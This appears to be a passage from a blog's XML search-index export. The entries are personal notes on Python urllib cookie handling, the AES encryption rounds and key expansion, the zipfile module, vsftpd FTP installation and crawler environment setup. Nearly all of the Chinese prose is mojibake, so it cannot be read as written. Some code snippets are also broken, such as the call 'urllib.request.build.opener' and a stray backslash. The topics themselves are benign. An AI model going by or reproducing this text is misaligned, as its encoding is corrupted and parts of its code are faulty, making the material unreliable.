ç¬¬äº”ä¸ªå‚æ•°unverifiableè¡¨ç¤ºè¿™ä¸ªè¯·æ±‚æ˜¯å¦æ˜¯æ— æ³•éªŒè¯çš„ï¼Œé»˜è®¤æ˜¯Falseï¼Œæ„æ€å°±æ˜¯è¯´ç”¨æˆ·æ²¡æœ‰è¶³å¤Ÿæƒé™æ¥é€‰æ‹©æŽ¥æ”¶è¿™ä¸ªè¯·æ±‚çš„ç»“æžœã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬è¯·æ±‚ä¸€ä¸ªHTMLæ–‡æ¡£ä¸­çš„å›¾ç‰‡ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰è‡ªåŠ¨æŠ“å–å›¾åƒçš„æƒé™ï¼Œè¿™æ—¶unverifiableçš„å€¼å°±æ˜¯True ç¬¬å…­ä¸ªå‚æ•°methodæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨æ¥æŒ‡ç¤ºè¯·æ±‚ä½¿ç”¨çš„æ–¹æ³•ï¼Œæ¯”å¦‚GETã€POSTå’ŒPUTç­‰ã€‚ é«˜çº§ç”¨æ³•: ä»…ä»…æž„é€ è¯·æ±‚è¿˜ä¸å¤Ÿï¼Œå¯¹äºŽä¸€äº›æ›´é«˜çº§çš„æ“ä½œï¼Œå¦‚Cookieså¤„ç†ï¼Œä»£ç†è®¾ç½®ç­‰ï¼Œå°±éœ€è¦Handlerã€‚å¯ä»¥æŠŠå®ƒç†è§£ä¸ºå„ç§å¤„ç†å™¨ï¼Œå¤„ç†ç™»å½•éªŒè¯çš„ï¼Œå¤„ç†Cookiesçš„ï¼Œå¤„ç†ä»£ç†è®¾ç½®çš„ã€‚åˆ©ç”¨å®ƒå¯ä»¥åšçš„HTTPè¯·æ±‚ä¸­çš„æ‰€æœ‰äº‹ã€‚ urllib.requestæ¨¡å—ä¸­çš„BaseHandlerç±»æ˜¯æ‰€æœ‰å…¶ä»–Handlerç±»çš„çˆ¶ç±»ï¼Œæä¾›äº†æœ€åŸºæœ¬çš„æ–¹æ³•å¦‚default_open(),protocol_request()ï¼ŒæŽ¥ä¸‹æ¥å°±æœ‰å„ç§å­ç±»ç»§æ‰¿BaseHandlerç±»ï¼š HTTPDefaultErrorHandlerï¼šç”¨äºŽå¤„ç†å“åº”é”™è¯¯ï¼Œé”™è¯¯ä¼šæŠ›å‡ºHTTPErrorçš„å¼‚å¸¸ã€‚ HTTPRedirectHandlerï¼šç”¨äºŽå¤„ç†é‡å®šå‘ã€‚ HTTPCookieProcessorï¼šç”¨äºŽå¤„ç†Cookiesã€‚ ProxyHandlerï¼šç”¨äºŽä»£ç†è®¾ç½®ï¼Œé»˜è®¤ä»£ç†ä¸ºç©ºã€‚ HTTPPasswordMgrï¼šç”¨äºŽç®¡ç†å¯†ç ï¼Œç»´æŠ¤äº†ç”¨æˆ·åå’Œå¯†ç çš„è¡¨ã€‚ HTTPBasicAuthHandlerï¼šç”¨äºŽç®¡ç†è®¤è¯ã€‚ å¦å¤–ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„ç±»å°±æ˜¯OpenerDirectorï¼Œå¯ä»¥ç§°ä¹‹ä¸ºOpenerã€‚ä¹‹å‰ä½¿ç”¨è¿‡çš„urlopenå®žé™…ä¸Šå°±æ˜¯urllibä¸ºæˆ‘ä»¬æä¾›çš„ä¸€ä¸ªopenerã€‚å¼•å…¥openerèƒ½å¤Ÿå®žçŽ°æ›´é«˜çº§çš„åŠŸèƒ½ï¼Œä¹‹å‰ä½¿ç”¨çš„requestå’Œurlopen()ç›¸å½“äºŽç±»åº“ä¸ºä½ å°è£…å¥½äº†å¸¸ç”¨çš„è¯·æ±‚æ–¹æ³•èƒ½å¤Ÿå®ŒæˆåŸºæœ¬çš„è¯·æ±‚ã€‚å®žçŽ°æ›´é«˜çº§çš„åŠŸèƒ½éœ€è¦äº†è§£åº•å±‚çš„é…ç½®ã€‚Openerä¸ŽHandlerçš„å…³ç³»ï¼šåˆ©ç”¨Handleræ¥æž„å»ºOpenerã€‚ éªŒè¯ ä»£ç† cookieså¤„ç† 12345678import http.cookiejar,urllib.requestcookie = http.cookiejar.CookieJar()handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&quot;http://www.baidu.com&quot;)for item in cookie: print(item.name+&quot;=&quot;+item.value) ä¸‰è€…éƒ½æ˜¯ä½¿ç”¨ç›¸å…³çš„å‡½æ•° cookiesè¾“å‡ºä¸ºæ–‡ä»¶æ ¼å¼ï¼š 123456filename = &apos;cookies.txt&apos;cookie = http.cookiejar.MozillaCookieJar(filename)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build.opener(handler)\response = opener.open(&apos;http://www.baidu.com&apos;)cookie.save(ignore_discard=True,ignore_expires=True) è¿™æ—¶CookieJarå°±éœ€è¦æ¢æˆMozillaCookieJarï¼Œå®ƒåœ¨ç”Ÿæˆæ–‡ä»¶æ—¶ä¼šç”¨åˆ°ï¼Œæ˜¯CookieJarçš„å­ç±»ï¼Œå¯ä»¥ç”¨æ¥å¤„ç†Cookieså’Œæ–‡ä»¶ç›¸å…³çš„äº‹ä»¶ï¼Œæ¯”å¦‚è¯»å–å’Œä¿å­˜Cookiesï¼Œå¯ä»¥å°†Cookiesä¿å­˜æˆMozillaåž‹æµè§ˆå™¨çš„Cookiesæ ¼å¼]]></content>
  </entry>
  <entry>
    <title><![CDATA[AESåŠ å¯†]]></title>
    <url>%2F2020%2F03%2F29%2FAES%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[AESåŠ å¯†è¯¦è§£AESåŠ å¯†æ¶‰åŠåˆ°å››ç§æ“ä½œï¼Œåˆ†åˆ«æ˜¯å­—èŠ‚ä»£æ›¿ï¼Œè¡Œç§»ä½ï¼Œåˆ—æ··æ·†å’Œè½®å¯†é’¥åŠ ã€‚çœ‹èµ·æ¥å¾ˆé«˜å¤§ä¸Šï¼Œå…¶å®žæŠŠè¿™å‡ ä¸ªåè¯ç†è§£äº†ï¼ŒåŠ å¯†è¿‡ç¨‹ä¹Ÿå°±é€šé€äº†ã€‚ è§£å¯†è¿‡ç¨‹åˆ†åˆ«ä¸ºå¯¹åº”çš„é€†æ“ä½œï¼Œç”±äºŽæ¯ä¸€æ­¥æ“ä½œéƒ½æ˜¯å¯é€†çš„ï¼ŒæŒ‰ç…§ç›¸åçš„é¡ºåºè¿›è¡Œè§£å¯†å³å¯æ¢å¤æ˜Žæ–‡ã€‚ åŠ è§£å¯†è¿‡ç¨‹ä¸­æ¯è½®å¯†é’¥éƒ½ç”±åˆå§‹å¯†é’¥æ‰©å±•å¾—åˆ°ï¼Œåœ¨æ¯ä¸€æ¬¡è½®å¯†é’¥åŠ çš„æ“ä½œä¸­ç”¨åˆ°ã€‚ æ ¹æ®åˆ†ç»„é•¿åº¦128bitï¼Œå¯†é’¥é•¿åº¦128bit/192bit/256bitåˆ†åˆ«åŠ å¯†ä¸åŒçš„è½®æ•°ï¼ˆ10ï¼Œ12ï¼Œ14ï¼‰ã€‚ ç®—æ³•ä¸­16ä¸ªå­—èŠ‚(128bit)çš„æ˜Žæ–‡å¯†æ–‡å¯†é’¥éƒ½ä»¥ä¸€ä¸ª4*4çš„çŸ©é˜µè¡¨ç¤ºã€‚ è¾“å…¥æ˜Žæ–‡ è½®å¯†é’¥åŠ  {å­—èŠ‚ä»£æ›¿ï¼Œè¡Œç§»ä½ï¼Œåˆ—æ··æ·†ï¼Œè½®å¯†é’¥åŠ }å¾ªçŽ¯è¿›è¡Œn-1è½® å­—èŠ‚ä»£æ›¿ï¼Œè¡Œç§»ä½ï¼Œè½®å¯†é’¥åŠ  è¾“å‡ºå¯†æ–‡ å­—èŠ‚æ›¿ä»£å­—èŠ‚æ›¿ä»£çš„ä¸»è¦åŠŸèƒ½æ˜¯é€šè¿‡Sç›’å®Œæˆä¸€ä¸ªå­—èŠ‚åˆ°å¦ä¸€ä¸ªå­—èŠ‚çš„æ˜ å°„ï¼Œè¯´ç™½äº†å°±æ˜¯æŸ¥è¡¨ã€‚Sç›’ç”¨äºŽæä¾›å¯†ç ç®—æ³•çš„æ··æ·†æ€§ã€‚è¾“å…¥çš„é«˜4bitå¯¹åº”çš„å€¼ä¸ºè¡Œæ ‡ï¼Œä½Ž4bitå¯¹åº”çš„å€¼ä¸ºåˆ—æ ‡ã€‚ è¡Œç§»ä½è¡Œç§»ä½æ˜¯ä¸€ä¸ª4*4çš„çŸ©é˜µå†…éƒ¨å­—èŠ‚ä¹‹é—´çš„ç½®æ¢ï¼Œç”¨äºŽæä¾›ç®—æ³•çš„æ‰©å±•æ€§ã€‚åŠ å¯†æ—¶ï¼Œç¬¬ä¸€è¡Œä¿æŒä¸å˜ï¼Œç¬¬äºŒè¡Œå¾ªçŽ¯å·¦ç§»8bit(çŸ©é˜µä¸­çš„ä¸€æ ¼)ï¼Œç¬¬ä¸‰è¡Œå¾ªçŽ¯å·¦ç§»16bit(çŸ©é˜µä¸­çš„ä¸¤æ ¼)ï¼Œç¬¬å››è¡Œå¾ªçŽ¯å·¦ç§»24bit(çŸ©é˜µä¸­çš„ä¸‰æ ¼)ã€‚ 1state[i][j] = state[i][(j+1)%4],i,jâˆˆ[0,3] åˆ—æ··æ·†åˆ©ç”¨GF(2â¸)åŸŸä¸Šç®—æ•°ç‰¹æ€§çš„ä¸€ä¸ªä»£æ›¿ï¼ŒåŒæ ·ç”¨äºŽæä¾›ç®—æ³•çš„æ‰©æ•£æ€§ã€‚ ç”±çŸ©é˜µä¹˜æ³•ï¼Œåœ¨åˆ—æ··æ·†çš„è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸ªå­—èŠ‚å¯¹åº”çš„å€¼åªä¸Žè¯¥åˆ—çš„å››ä¸ªå€¼æœ‰å…³ã€‚æ­¤å¤„ä¹˜æ³•å’ŒåŠ æ³•éƒ½æ˜¯å®šä¹‰åœ¨GF(2â¸)ä¸Šçš„ã€‚ å°†æŸä¸ªå­—èŠ‚æ‰€å¯¹åº”çš„å€¼ä¹˜ä»¥2ï¼Œå…¶ç»“æžœå°±æ˜¯å°†è¯¥å€¼çš„äºŒè¿›åˆ¶ä½å·¦ç§»ä¸€ä½ï¼Œå¦‚æžœåŽŸå§‹å€¼çš„æœ€é«˜ä½ä¸º1ï¼Œåˆ™è¿˜éœ€è¦å°†ç§»ä½åŽçš„ç»“æžœå¼‚æˆ–00011011ï¼› ä¹˜æ³•å¯¹åŠ æ³•æ»¡è¶³åˆ†é…çŽ‡ï¼Œä¾‹å¦‚ï¼š07Â·S0,0=(01âŠ•02âŠ•04)Â·S0,0= S0,0âŠ•(02Â·S0,0)(04Â·S0,0)ã€‚ æ­¤å¤„çš„çŸ©é˜µä¹˜æ³•ä¸Žä¸€èˆ¬æ„ä¹‰ä¸ŠçŸ©é˜µçš„ä¹˜æ³•æœ‰æ‰€ä¸åŒï¼Œå„ä¸ªå€¼åœ¨ç›¸åŠ æ—¶ä½¿ç”¨çš„æ˜¯æ¨¡2â¸åŠ æ³•ï¼ˆå¼‚æˆ–è¿ç®—ï¼‰ã€‚å½¢å¼æ˜¯çŸ©é˜µä¹˜æ³•çš„å½¢å¼ï¼Œè¿ç®—ä¸æ˜¯ä¸€èˆ¬æ„ä¹‰ä¹˜æ³•çš„è¿ç®—ã€‚ è½®å¯†é’¥åŠ æ“ä½œç›¸å¯¹ç®€å•ï¼Œä¾æ®çš„åŽŸç†æ˜¯â€œä»»ä½•æ•°å’Œè‡ªèº«çš„å¼‚æˆ–ç»“æžœä¸º0â€ï¼ŒåŠ å¯†è¿‡ç¨‹ä¸­å—ï¼Œæ¯è½®çš„è¾“å…¥ä¸Žè½®å­å¯†é’¥å¼‚æˆ–ä¸€æ¬¡ã€‚è§£å¯†æ—¶å†å¼‚æˆ–ä¸€æ¬¡å³å¯æ¢å¤ã€‚ å¯†é’¥æ‰©å±• å¯†é’¥æ‰©å±•è¿‡ç¨‹è¯´æ˜Žï¼š 1) å°†ç§å­å¯†é’¥æŒ‰å›¾(a)çš„æ ¼å¼æŽ’åˆ—ï¼Œå…¶ä¸­k0ã€k1ã€â€¦â€¦ã€k15ä¾æ¬¡è¡¨ç¤ºç§å­å¯†é’¥çš„ä¸€ä¸ªå­—èŠ‚ï¼›æŽ’åˆ—åŽç”¨4ä¸ª32æ¯”ç‰¹çš„å­—è¡¨ç¤ºï¼Œåˆ†åˆ«è®°ä¸ºw[0]ã€w[1]ã€w[2]ã€w[3]ï¼› 2) æŒ‰ç…§å¦‚ä¸‹æ–¹å¼ï¼Œä¾æ¬¡æ±‚è§£w[j]ï¼Œå…¶ä¸­jæ˜¯æ•´æ•°å¹¶ä¸”å±žäºŽ[4,43]ï¼› 3) è‹¥j%4=0,åˆ™w[j]=w[j-4]âŠ•g(w[j-1]),å¦åˆ™w[j]=w[j-4]âŠ•w[j-1]ï¼› å‡½æ•°gçš„æµç¨‹è¯´æ˜Žï¼š a) å°†wå¾ªçŽ¯å·¦ç§»8æ¯”ç‰¹ï¼› b) åˆ†åˆ«å¯¹æ¯ä¸ªå­—èŠ‚åšSç›’ç½®æ¢ï¼› c) ä¸Ž32æ¯”ç‰¹çš„å¸¸é‡ï¼ˆRC[j/4],0,0,0ï¼‰è¿›è¡Œå¼‚æˆ–ï¼ŒRCæ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œå…¶å€¼å¦‚ä¸‹ã€‚ï¼ˆRCçš„å€¼åªéœ€è¦æœ‰10ä¸ªï¼Œè€Œæ­¤å¤„ç”¨äº†11ä¸ªï¼Œå®žé™…ä¸ŠRC[0]åœ¨è¿ç®—ä¸­æ²¡æœ‰ç”¨åˆ°ï¼Œå¢žåŠ RC[0]æ˜¯ä¸ºäº†ä¾¿äºŽç¨‹åºä¸­ç”¨æ•°ç»„è¡¨ç¤ºã€‚ç”±äºŽjçš„æœ€å°å–å€¼æ˜¯4ï¼Œj/4çš„æœ€å°å–å€¼åˆ™æ˜¯1ï¼Œå› æ­¤ä¸ä¼šäº§ç”Ÿé”™è¯¯ã€‚ï¼‰ RC = {0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36}]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonçš„zipfileæ¨¡å—]]></title>
    <url>%2F2020%2F03%2F25%2Fpython%E7%9A%84zipfile%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[zipfileæ˜¯pythoné‡Œç”¨æ¥åšzipæ ¼å¼ç¼–ç çš„åŽ‹ç¼©å’Œè§£åŽ‹ç¼©çš„ã€‚æœ‰ä¸¤ä¸ªéžå¸¸å¸¸ç”¨çš„class, åˆ†åˆ«æ˜¯ZipFileå’ŒZipInfo, åœ¨ç»å¤§å¤šæ•°çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨è¿™ä¸¤ä¸ªclasså°±å¯ä»¥äº†ã€‚ ZipFileæ˜¯ä¸»è¦çš„ç±»ï¼Œç”¨æ¥åˆ›å»ºå’Œè¯»å–zipæ–‡ä»¶è€ŒZipInfoæ˜¯å­˜å‚¨çš„zipæ–‡ä»¶çš„æ¯ä¸ªæ–‡ä»¶çš„ä¿¡æ¯çš„ã€‚ ZipFileå’ŒZipinfoè¿™ä¸¤ä¸ªç±»çš„åŸºæœ¬æ“ä½œ1class zipfile.ZipFile(file,mode,compression,allowZip64) åˆ›å»ºä¸€ä¸ªZipFileå¯¹è±¡ï¼Œè¡¨ç¤ºä¸€ä¸ªzipæ–‡ä»¶ã€‚å‚æ•°fileè¡¨ç¤ºæ–‡ä»¶çš„è·¯å¾„,å‚æ•°modeæŒ‡ç¤ºæ‰“å¼€zipæ–‡ä»¶çš„æ¨¡å¼ï¼Œé»˜è®¤å€¼ä¸ºâ€™râ€™ï¼Œè¡¨ç¤ºè¯»å·²ç»å­˜åœ¨çš„zipæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä¸ºâ€™wâ€™æˆ–â€™aâ€™ï¼Œâ€™wâ€™è¡¨ç¤ºæ–°å»ºä¸€ä¸ªzipæ–‡æ¡£æˆ–è¦†ç›–ä¸€ä¸ªå·²ç»å­˜åœ¨çš„zipæ–‡æ¡£,â€™aâ€™è¡¨ç¤ºå°†æ•°æ®é™„åŠ åˆ°ä¸€ä¸ªçŽ°å­˜çš„zipæ–‡æ¡£ä¸­ã€‚å‚æ•°compressionè¡¨ç¤ºåœ¨å†™zipæ–‡æ¡£æ—¶ä½¿ç”¨çš„åŽ‹ç¼©æ–¹æ³•ï¼Œå®ƒçš„å€¼å¯ä»¥æ˜¯zipfile. ZIP_STORED æˆ–zipfile. ZIP_DEFLATEDã€‚å¦‚æžœè¦æ“ä½œçš„zipæ–‡ä»¶å¤§å°è¶…è¿‡2Gï¼Œåº”è¯¥å°†allowZip64è®¾ç½®ä¸ºTrueã€‚ 1ZipFile.getinfo(name) èŽ·å–zipæ–‡æ¡£å†…æŒ‡å®šæ–‡ä»¶çš„ä¿¡æ¯ã€‚è¿”å›žä¸€ä¸ªzipfile.ZipInfoå¯¹è±¡ï¼Œå®ƒåŒ…æ‹¬æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ã€‚ 1ZipFile.infolist() èŽ·å–zipæ–‡æ¡£å†…æ‰€æœ‰æ–‡ä»¶çš„ä¿¡æ¯ï¼Œè¿”å›žä¸€ä¸ªzipfile.ZipInfoçš„åˆ—è¡¨ã€‚ 1ZipFile.namelist() èŽ·å–zipæ–‡æ¡£å†…æ‰€æœ‰æ–‡ä»¶çš„åç§°åˆ—è¡¨ã€‚ 1ZipFile.extract(member, path, pwd) å°†zipæ–‡æ¡£å†…çš„æŒ‡å®šæ–‡ä»¶è§£åŽ‹åˆ°å½“å‰ç›®å½•ã€‚å‚æ•°memberæŒ‡å®šè¦è§£åŽ‹çš„æ–‡ä»¶åç§°æˆ–å¯¹åº”çš„ZipInfoå¯¹è±¡ï¼›å‚æ•°pathæŒ‡å®šäº†è§£æžæ–‡ä»¶ä¿å­˜çš„æ–‡ä»¶å¤¹ï¼›å‚æ•°pwdä¸ºè§£åŽ‹å¯†ç ã€‚ 1os.getcwd() ç”¨äºŽè¿”å›žå½“å‰å·¥ä½œç›®å½•ã€‚ 1os.path.join() è¿žæŽ¥ä¸¤ä¸ªæˆ–æ›´å¤šçš„è·¯å¾„åç»„ä»¶ã€‚1.å¦‚æžœå„ç»„ä»¶åé¦–å­—æ¯ä¸åŒ…å«â€™/â€™ï¼Œåˆ™å‡½æ•°ä¼šè‡ªåŠ¨åŠ ä¸Šã€‚2.å¦‚æžœæœ‰ä¸€ä¸ªç»„ä»¶æ˜¯ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œåˆ™åœ¨å®ƒä¹‹å‰çš„æ‰€æœ‰ç»„ä»¶å‡ä¼šè¢«èˆå¼ƒã€‚3.å¦‚æžœæœ€åŽä¸€ä¸ªç»„ä»¶ä¸ºç©ºï¼Œåˆ™ç”Ÿæˆçš„è·¯å¾„ä»¥ä¸€ä¸ªâ€™/â€™åˆ†éš”ç¬¦ç»“å°¾ã€‚ 1ZipFile.extractall(path, members, pwd) è§£åŽ‹zipæ–‡æ¡£ä¸­çš„æ‰€æœ‰æ–‡ä»¶åˆ°å½“å‰ç›®å½•ã€‚å‚æ•°membersçš„é»˜è®¤å€¼ä¸ºzipæ–‡æ¡£å†…çš„æ‰€æœ‰æ–‡ä»¶åç§°åˆ—è¡¨ï¼Œä¹Ÿå¯ä»¥è‡ªå·±è®¾ç½®ï¼Œé€‰æ‹©è¦è§£åŽ‹çš„æ–‡ä»¶åç§°ã€‚ 1ZipFile.printdir() å°†zipæ–‡æ¡£å†…çš„ä¿¡æ¯æ‰“å°åˆ°æŽ§åˆ¶å°ä¸Šã€‚ 1ZipFile.setpassword(pwd) è®¾ç½®zipæ–‡æ¡£çš„å¯†ç ã€‚ 1ZipFile.read(name, pwd) èŽ·å–zipæ–‡æ¡£å†…æŒ‡å®šæ–‡ä»¶çš„äºŒè¿›åˆ¶æ•°æ®ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[Docker]]></title>
    <url>%2F2020%2F03%2F24%2FDocker%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[FTPé…ç½®]]></title>
    <url>%2F2020%2F03%2F21%2FFTP%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[è¯´èµ·æ¥æœ‰ç‚¹æžç¬‘ï¼ŒæŸ¥åˆ°è…¾è®¯äº‘çš„æ•™ç¨‹ï¼Œçœ‹webshellçš„æ ‡å‡†ç™»é™†æ–¹å¼ï¼Œå‘çŽ°å‡ºæ¥ä¸ªäºŒç»´ç è®©æˆ‘ç™»å½•ï¼Œæ„£äº†æ„£ï¼Œæƒ³èµ·æ¥è‡ªå·±é¢†çš„æ˜¯é˜¿é‡Œäº‘ã€‚ Vsftpdå³very secure FTP daemonï¼Œæ˜¯ä¼—å¤šLinuxå‘è¡Œç‰ˆæœ¬ä¸­é»˜è®¤çš„FTPæœåŠ¡å™¨ã€‚å®‰è£…æ­¥éª¤ï¼š é¦–å…ˆæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£…vsftpdã€‚ 1yum install -y vsftpd è®¾ç½®vsftpdå¼€æœºè‡ªå¯ã€‚ 1systemctl enable vsftpd å¯åŠ¨FTPæœåŠ¡ã€‚ 1systemctl start vsftpd ç¡®è®¤å¯åŠ¨ã€‚ 1netstat -antup | grep ftp é…ç½®vsftpdã€‚ 12useradd namepasswd nameåŽè¾“å…¥å¯†ç ]]></content>
      <tags>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[çŽ¯å¢ƒé…ç½®ä¸Žçˆ¬è™«åŸºç¡€]]></title>
    <url>%2F2020%2F03%2F17%2F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bpython3%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[[TOC] ç¬¬ä¸€ç« ï¼šçŽ¯å¢ƒé…ç½®Python3çš„å®‰è£…æŽ¨èäº†Anacondaï¼Œæ³¨æ„çŽ¯å¢ƒå˜é‡é…ç½®ã€‚ ä½œè€…æŽ¨èè§£å†³ç‰ˆæœ¬å†²çªé—®é¢˜çš„æ–¹æ³•ï¼šå°†å®‰è£…ç›®å½•ä¸­çš„python.exeå¤åˆ¶ä¸€ä»½ï¼Œå‘½åä¸ºpython3.exeï¼Œèƒ½å¤Ÿæ›´å¥½åœ°åŒºåˆ†pythonç‰ˆæœ¬ã€‚ è¯·æ±‚åº“çš„å®‰è£…çˆ¬è™«å¯ä»¥ç®€å•åˆ†ä¸ºå‡ æ­¥ï¼šæŠ“å–é¡µé¢ï¼Œåˆ†æžé¡µé¢å’Œå­˜å‚¨æ•°æ®ã€‚åœ¨æŠ“å–é¡µé¢çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ¨¡æ‹Ÿæµè§ˆå™¨å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œæ‰€ä»¥éœ€è¦pythonåº“æ¥å®žçŽ°HTTPè¯·æ±‚æ“ä½œã€‚ requestsçš„å®‰è£… åˆ†ä¸ºpip+åº“åå®‰è£…ï¼Œwheelï¼ˆåŽŸæ¥åŽç¼€ä¸º.whlæ˜¯è¿™ä¸ªæ„æ€ï¼Œå®‰è£…å¥½wheelåº“åŽç›´æŽ¥ç”¨pip3å‘½ä»¤+æ–‡ä»¶åï¼‰å®‰è£…ä¸Žæºç å®‰è£…ï¼ˆè¿™ä¸ªæ²¡å¬è¿‡ï¼Œcd requestsï¼Œpython3 setup.py installï¼‰ã€‚ 2.Seleniumçš„å®‰è£… Seleniumæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·ï¼Œåˆ©ç”¨å®ƒå¯ä»¥é©±ä½¿æµè§ˆå™¨æ‰§è¡Œç‰¹å®šåŠ¨ä½œï¼Œå¦‚ç‚¹å‡»/ä¸‹æ‹‰ã€‚å¯¹äºŽJSæ¸²æŸ“çš„é¡µé¢éžå¸¸æœ‰æ•ˆã€‚ å®‰è£…æ–¹å¼åŒä¸Šï¼Œä½†è¿˜éœ€è¦é…ç½®æµè§ˆå™¨æ¥é…åˆå…¶å·¥ä½œã€‚ ChromeDriverå®‰è£…å®‰è£…ChromeDriverèƒ½å¤Ÿé©±åŠ¨Chromeå®Œæˆç›¸åº”çš„æ“ä½œã€‚æ³¨æ„åœ¨Chromeä¸­è¾“å…¥chrome://version/æŸ¥çœ‹ç‰ˆæœ¬ï¼Œä¸åŒç‰ˆæœ¬çš„Chromeä¸ŽChromeDriverä¸é€‚é…ã€‚ ä¸‹è½½å®ŒåŽå°†ChromeDriver.exeæ”¾åˆ°Chromeå®‰è£…çš„æ–‡ä»¶å¤¹å¹¶é…ç½®çŽ¯å¢ƒå˜é‡ï¼ˆç”¨æˆ·å˜é‡ï¼‰ã€‚ 1234567å‘½ä»¤è¡Œé…ç½®çŽ¯å¢ƒå˜é‡çš„å¿«æ·æ–¹å¼ï¼šexport PATH=&quot;$PATH:å¤åˆ¶çš„è·¯å¾„&quot;ä¿å­˜åŽæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼šsource ~/.profileæµ‹è¯•ï¼šfrom selenium import webdriverbrowser = webdriver.Chrome() æ­¤å¤„åœ¨cmdä¸­æ‰§è¡Œè¯¥å‘½ä»¤æŠ¥é”™æ²¡æœ‰seleniumè¿™ä¸ªæ¨¡å—ï¼Œç™¾åº¦å¾—çŸ¥æ˜¯seleniumä¸èƒ½é€šè¿‡pip installå®‰è£…ï¼Œè¦åˆ°å®˜ç½‘ä¸‹è½½ç„¶åŽåœ¨è§£åŽ‹è·¯å¾„ä¸‹æ‰§è¡Œpython setup.py install.å°±æ˜¯ç¬¬ä¸‰ç§æºç å®‰è£…ã€‚è¿™å›žæ€»ç®—æ²¡æŠ¥é”™ï¼Œç®—æ˜¯æ¯ç§æ–¹æ³•éƒ½å°è¯•è¿‡äº†ã€‚ aiohttpçš„å®‰è£…requestsåº“æ˜¯ä¸€ä¸ªé˜»å¡žå¼HTTPè¯·æ±‚åº“ï¼Œå½“æˆ‘ä»¬å‘å‡ºä¸€ä¸ªè¯·æ±‚åŽï¼Œç¨‹åºä¼šä¸€ç›´ç­‰å¾…æœåŠ¡å™¨å“åº”ï¼Œç›´åˆ°å¾—åˆ°å“åº”åŽæ‰ä¼šè¿›è¡Œä¸‹ä¸€æ­¥å¤„ç†ã€‚è¿™ä¸ªè¿‡ç¨‹å¾ˆè€—æ—¶é—´ã€‚å¦‚æžœç¨‹åºå¯ä»¥åœ¨è¿™ä¸ªç­‰å¾…è¿‡ç¨‹ä¸­åšä¸€äº›å…¶ä»–äº‹æƒ…ï¼Œåˆ™ä¼šå¤§å¤§æé«˜çˆ¬å–æ•ˆçŽ‡ã€‚aiohttpå°±æ˜¯è¿™æ ·æä¾›å¼‚æ­¥webæœåŠ¡çš„åº“ï¼Œä»Žpython3.5å¼€å§‹åŠ å…¥äº†async/awaitå…³é”®å­—ï¼Œä½¿å¾—å›žè°ƒçš„å†™æ³•æ›´åŠ ç›´è§‚ä¸Žäººæ€§åŒ–ã€‚aiohttpå€ŸåŠ©äºŽasync/awaitã€‚ 123pip install aiohttppip install cchardet aiodns lxmlçš„å®‰è£…lxmlæ˜¯pythonçš„è§£æžåº“ï¼Œæ”¯æŒHTMLå’ŒXMLè§£æžï¼Œæ”¯æŒXPathè§£æžæ–¹å¼ã€‚ å¦‚æžœæ²¡æœ‰ä»»ä½•æŠ¥é”™ï¼Œåˆ™è¯æ˜Žå®‰è£…æˆåŠŸã€‚å¦‚æžœå‡ºçŽ°æŠ¥é”šï¼Œæ¯”å¦‚æç¤ºç¼ºå°‘libxml2åº“ç­‰ä¿¡æ¯ï¼Œå¯ä»¥é‡‡ç”¨wheelæ–¹å¼å®‰è£…ã€‚æŽ¨èç›´æŽ¥åˆ°è¿™é‡Œï¼ˆé“¾æŽ¥ä¸ºï¼šhttp://www.lfd.uci.edu/-goblke/pythonlibs/#lxmlï¼‰ä¸‹è½½å¯¹åº”çš„wheelæ–‡ä»¶ï¼Œæ‰¾åˆ°æœ¬åœ°å®‰è£…Pythonç‰ˆæœ¬å’Œç³»ç»Ÿå¯¹åº”çš„lxmlç‰ˆæœ¬ï¼Œä¾‹å¦‚Windows64ä½ã€Python3.6ï¼Œå°±é€‰ä½œlxml-3 .8.0-cp36-cp36m-win _ amd64. whlï¼Œå°†å…¶ä¸‹è½½åˆ°æœ¬åœ°ã€‚ç„¶åŽpipã€‚ Beauitful Soupå®‰è£…Beauitful Soupæ˜¯pythonçš„ä¸€ä¸ªHTMLæˆ–XMLè§£æžåº“ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ–¹ä¾¿åœ°ä»Žç½‘é¡µä¸­æå–æ•°æ®ï¼Œå®ƒæ‹¥æœ‰å¼ºå¤§çš„APIä¸Žå¤šæ ·çš„è§£æžæ–¹å¼ã€‚ ç‰ˆæœ¬ç®¡ç†çœŸæ˜¯ä¸ªå¥‡å¦™çš„äº‹æƒ…ï¼Œå¥½å¥½ç”¨condaï¼ˆä¸ºå•¥é•œåƒæºè¿˜ä¼šæŠ¥é”™ï¼‰ 